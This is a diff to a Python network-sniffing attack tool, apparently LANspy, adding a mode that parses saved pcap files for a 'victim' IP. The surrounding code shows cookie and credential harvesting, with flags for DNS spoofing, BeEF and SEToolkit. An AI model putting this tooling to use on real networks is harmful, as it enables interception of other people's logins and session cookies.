@@ -52,6 +52,9 @@ parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/
 parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
 parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
 parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
+###########################################
+parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
+###########################################
 args = parser.parse_args()
 
 #Console colors
@@ -108,11 +111,17 @@ class Parser():
 	user_agent = None
 
 	def start(self, payload):
-		try:
-			data = payload.get_data()
-			pkt = IP(data)
-		except:
-			return
+		if args.pcap:
+			if args.ipaddress:
+				try:
+					pkt = payload[IP]
+				except:
+					return
+		else:
+			try:
+				pkt = IP(payload.get_data())
+			except:
+				return
 
 		IP_layer = pkt[IP]
 		IP_dst = pkt[IP].dst
@@ -404,7 +413,6 @@ class Parser():
 			if args.urlspy:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
 				if any(i in url for i in d):
-#					payload.set_verdict(nfqueue.NF_ACCEPT)
 					return
 				if len(url) > 146:
 					print '[*] '+url[:145]
@@ -490,7 +498,7 @@ class Parser():
 					return
 				else:
 					self.Cookies.append(x)
-				print P+'[+] Cookie found for '+W+host+P+' logged in intercept.log.txt'+W
+				print P+'[+] Cookie found for '+W+host+P+' logged in LANspy.log.txt'+W
 				logger.write('[+] Cookie found for'+host+':'+x.replace('Cookie: ', '')+'\n')
 
 	def user_pass(self, username, password):
@@ -866,9 +874,31 @@ def threads():
 		except:
 			print '[-] Could not open SEToolkit, continuing without it.'
 
+def pcap_handler():
+	global victimIP
+	bad_args = [args.dnsspoof, args.beef, args.code, args.nmap, args.nmapaggressive, args.driftnet, args.interface]
+	for x in bad_args:
+		if x:
+			sys.exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
+	if args.pcap:
+		if args.ipaddress:
+			victimIP = args.ipaddress
+			pcap = rdpcap(args.pcap)
+			for payload in pcap:
+				Parser().start(payload)
+			sys.exit('[-] Finished parsing pcap file')
+		else:
+			sys.exit('[-] Please include the following arguement when reading from a pcap file: -ip [target\'s IP address]')
+	else:
+		sys.exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
 
+# Main loop
 def main():
 	global victimIP, interface
+
+	if args.pcap:
+		pcap_handler()
+		sys.exit('[-] Finished parsing pcap file')
 
 	#Check if root
 	if not geteuid()==0:
